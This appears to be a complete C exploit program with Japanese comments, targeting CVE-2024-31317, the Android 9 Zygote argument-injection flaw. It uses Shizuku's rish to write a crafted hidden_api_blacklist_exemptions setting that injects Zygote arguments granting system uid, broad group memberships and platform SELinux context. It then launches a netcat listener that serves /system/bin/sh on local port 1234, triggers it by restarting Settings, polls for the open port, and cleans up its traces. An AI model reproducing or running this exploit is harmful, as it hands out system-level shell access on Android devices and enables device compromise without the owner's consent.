#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <errno.h>
#include <sys/stat.h>
#include <fcntl.h>

#define LOG_PATH "/sdcard/zygote_exploit.log"
#define TARGET_PORT 1234
#define MAX_ATTEMPTS 12
#define SLEEP_SEC 1

// ログ関数（タイムスタンプ付き）
void log_message(FILE *log_fp, const char *tag, const char *msg) {
    if (!log_fp) return;
    time_t now = time(NULL);
    struct tm *tm_info = localtime(&now);
    char time_buf[32];
    strftime(time_buf, sizeof(time_buf), "%Y-%m-%d %H:%M:%S", tm_info);
    fprintf(log_fp, "[%s] [%s] %s\n", time_buf, tag, msg);
    fflush(log_fp);
}

// コマンド実行＆出力キャプチャ（popen利用）
int exec_command(const char *cmd, char **output, size_t *out_len) {
    FILE *fp = popen(cmd, "r");
    if (!fp) {
        return -1;
    }
    char buf[1024];
    size_t total_len = 0;
    if (output) {
        *output = malloc(1);
        if (*output) (*output)[0] = '\0';
    }
    while (fgets(buf, sizeof(buf), fp) != NULL) {
        if (output && *output) {
            size_t len = strlen(buf);
            *output = realloc(*output, total_len + len + 1);
            if (*output) {
                memcpy(*output + total_len, buf, len);
                total_len += len;
                (*output)[total_len] = '\0';
            }
        }
    }
    if (out_len) *out_len = total_len;
    return pclose(fp); // 終了ステータスを返す
}

// ポートがListen状態か /proc/net/tcp を直接チェック（高速・副作用なし）
int is_port_listening(int port) {
    FILE *fp = fopen("/proc/net/tcp", "r");
    if (!fp) return 0;
    
    char line[256];
    char hex_port[16];
    snprintf(hex_port, sizeof(hex_port), ":%04X", port); // 例: 1234 -> :04D2
    
    int found = 0;
    while (fgets(line, sizeof(line), fp)) {
        // フォーマット: sl local_address rem_address st ...
        // local_address は "0100007F:04D2" のように表記される
        if (strstr(line, hex_port) != NULL) {
            // ステータスが 0A (LISTEN) か確認 (16進数で 0x0A)
            char *ptr = line;
            int field = 0;
            char *token = strtok(line, " ");
            while (token != NULL) {
                if (field == 3) { // ステータスフィールド (0A が LISTEN)
                    if (strcmp(token, "0A") == 0) {
                        found = 1;
                    }
                    break;
                }
                field++;
                token = strtok(NULL, " ");
            }
            if (found) break;
        }
    }
    fclose(fp);
    return found;
}

// コマンド実行＆ログ記録（標準出力/エラーも含む）
int exec_and_log(FILE *log_fp, const char *cmd, const char *step_name, int allow_fail) {
    char *output = NULL;
    size_t out_len = 0;
    
    char log_buf[512];
    snprintf(log_buf, sizeof(log_buf), "Executing: %s", step_name);
    log_message(log_fp, "INFO", log_buf);
    snprintf(log_buf, sizeof(log_buf), "CMD: %s", cmd);
    log_message(log_fp, "DEBUG", log_buf);
    
    int status = exec_command(cmd, &output, &out_len);
    int ret = 0;
    
    if (output && out_len > 0) {
        snprintf(log_buf, sizeof(log_buf), "Output (%zu bytes):\n%s", out_len, output);
        log_message(log_fp, "OUTPUT", log_buf);
    }
    
    if (status == 0) {
        log_message(log_fp, "SUCCESS", step_name);
        ret = 0;
    } else {
        snprintf(log_buf, sizeof(log_buf), "%s failed with status %d", step_name, status);
        log_message(log_fp, "ERROR", log_buf);
        ret = -1;
    }
    
    free(output);
    return ret;
}

int main(int argc, char **argv) {
    // ログファイルを開く（追記モード）
    FILE *log_fp = fopen(LOG_PATH, "a");
    if (!log_fp) {
        // /sdcard/ がマウントされていない場合のフォールバック（コンソールのみ）
        log_fp = stderr;
    } else {
        setvbuf(log_fp, NULL, _IONBF, 0);
    }
    
    log_message(log_fp, "START", "=== Zygote Exploit (CVE-2024-31317) for Android 9 ===");
    log_message(log_fp, "INFO", "Target: 127.0.0.1:1234 (/system/bin/sh)");

    // ---------- フェーズ0: 環境チェック ----------
    int rish_exists = (system("command -v rish > /dev/null 2>&1") == 0);
    if (!rish_exists) {
        log_message(log_fp, "FATAL", "rish (Shizuku) not found in PATH. Aborting.");
        fprintf(stderr, "Error: rish not found. Please install Shizuku.\n");
        if (log_fp != stderr) fclose(log_fp);
        return 1;
    }
    log_message(log_fp, "INFO", "rish found.");

    // ---------- フェーズ1: クリーンアップ（既存のncを確実に殺す） ----------
    log_message(log_fp, "PHASE1", "Cleaning up old netcat instances...");
    char kill_cmd[128];
    snprintf(kill_cmd, sizeof(kill_cmd), "pkill -f 'nc.*%d'", TARGET_PORT);
    exec_and_log(log_fp, kill_cmd, "Kill old nc", 1); // 失敗してもOK（いなければそれでいい）

    // ---------- フェーズ2: Settings を強制停止 ----------
    log_message(log_fp, "PHASE2", "Stopping Settings app...");
    if (exec_and_log(log_fp, "am force-stop com.android.settings", "Force Stop Settings", 0) != 0) {
        log_message(log_fp, "WARN", "Force stop failed, but continuing...");
    }

    // ---------- フェーズ3: ペイロード生成＆注入 ----------
    log_message(log_fp, "PHASE3", "Injecting Zygote payload...");
    // Android 9 正規ペイロード: 引数カウント 10, --package-name なし, 全グループ権限付与
    const char *payload =
        "settings put global hidden_api_blacklist_exemptions \"LClass1;->method1(\n"
        "10\n"
        "--runtime-args\n"
        "--setuid=1000\n"
        "--setgid=1000\n"
        "--runtime-flags=2049\n"
        "--mount-external-full\n"
        "--setgroups=1001,1002,1003,1004,1005,1006,1007,1008,1009,1010,1018,1021,1023,1024,1032,1065,3001,3002,3003,3006,3007,3009,3010\n"
        "--nice-name=runnetcat\n"
        "--seinfo=platform:isSystemServer:system_app:targetSdkVersion=28:complete\n"
        "--invoke-with\n"
        "toybox nc -s 127.0.0.1 -p 1234 -L /system/bin/sh -l;\n"
        "\"";

    // rish -c で実行（ペイロードが非常に長いが、bashの引数制限には収まる）
    char inject_cmd[4096];
    snprintf(inject_cmd, sizeof(inject_cmd), "rish -c '%s'", payload);
    
    if (exec_and_log(log_fp, inject_cmd, "Zygote Injection", 0) != 0) {
        log_message(log_fp, "FATAL", "Injection command failed. Aborting.");
        if (log_fp != stderr) fclose(log_fp);
        return 1;
    }
    log_message(log_fp, "INFO", "Injection command sent successfully.");

    // ---------- フェーズ4: Settings 再起動（Zygote にペイロードを読ませるトリガー） ----------
    log_message(log_fp, "PHASE4", "Restarting Settings app to trigger Zygote...");
    if (exec_and_log(log_fp, "am start -a android.settings.SETTINGS", "Start Settings", 0) != 0) {
        log_message(log_fp, "WARN", "First start attempt failed, retrying with different intent...");
        // 多角的アプローチ: 明示的な Component 指定で再試行
        exec_and_log(log_fp, "am start -n com.android.settings/.Settings", "Start Settings (component)", 1);
        // もう一つの多角的アプローチ: バックグラウンド起動 (HOME 押下)
        exec_and_log(log_fp, "input keyevent KEYCODE_HOME && am start -a android.settings.SETTINGS", "Start Settings with HOME", 1);
    }

    // ---------- フェーズ5: ポートオープン待機（高速ポーリング） ----------
    log_message(log_fp, "PHASE5", "Waiting for port 1234 to become LISTEN...");
    int attempts = 0;
    int port_open = 0;
    while (attempts < MAX_ATTEMPTS) {
        if (is_port_listening(TARGET_PORT)) {
            port_open = 1;
            log_message(log_fp, "SUCCESS", "Port 1234 is now LISTENING!");
            break;
        }
        attempts++;
        char buf[64];
        snprintf(buf, sizeof(buf), "Port not ready (%d/%d), sleeping %ds...", attempts, MAX_ATTEMPTS, SLEEP_SEC);
        log_message(log_fp, "WAIT", buf);
        sleep(SLEEP_SEC);
    }

    if (!port_open) {
        log_message(log_fp, "WARN", "Port did not open within timeout. Trying fallback trigger...");
        // 多角的リカバリ: Settings を再度強制停止＆再起動
        exec_and_log(log_fp, "am force-stop com.android.settings", "Force Stop retry", 1);
        exec_and_log(log_fp, "am start -a android.settings.SETTINGS", "Start Settings retry", 1);
        
        // もう一度だけ短く待つ
        for (int i = 0; i < 4; i++) {
            if (is_port_listening(TARGET_PORT)) {
                port_open = 1;
                log_message(log_fp, "SUCCESS", "Port opened after fallback!");
                break;
            }
            sleep(1);
        }
    }

    // ---------- フェーズ6: クリーンアップ（隠しAPI免除設定を削除） ----------
    log_message(log_fp, "PHASE6", "Cleaning up hidden API exemptions...");
    exec_and_log(log_fp, "settings delete global hidden_api_blacklist_exemptions", "Cleanup exemptions", 0);
    log_message(log_fp, "INFO", "Cleanup command executed.");

    // ---------- 最終結果 ----------
    if (port_open) {
        log_message(log_fp, "RESULT", "EXPLOIT SUCCESSFUL! Shell is listening on 127.0.0.1:1234");
        fprintf(stdout, "\n[+] SUCCESS! Shell is waiting at 127.0.0.1:%d\n", TARGET_PORT);
        fprintf(stdout, "[+] Connect using: nc 127.0.0.1 %d\n", TARGET_PORT);
        fprintf(stdout, "[+] Full log saved to: %s\n", LOG_PATH);
    } else {
        log_message(log_fp, "RESULT", "EXPLOIT FAILED: Port did not open. Check log for details.");
        fprintf(stderr, "\n[-] EXPLOIT FAILED. Port %d is not listening.\n", TARGET_PORT);
        fprintf(stderr, "[-] Check detailed log: %s\n", LOG_PATH);
    }

    if (log_fp != stderr) fclose(log_fp);
    return port_open ? 0 : 1;
}
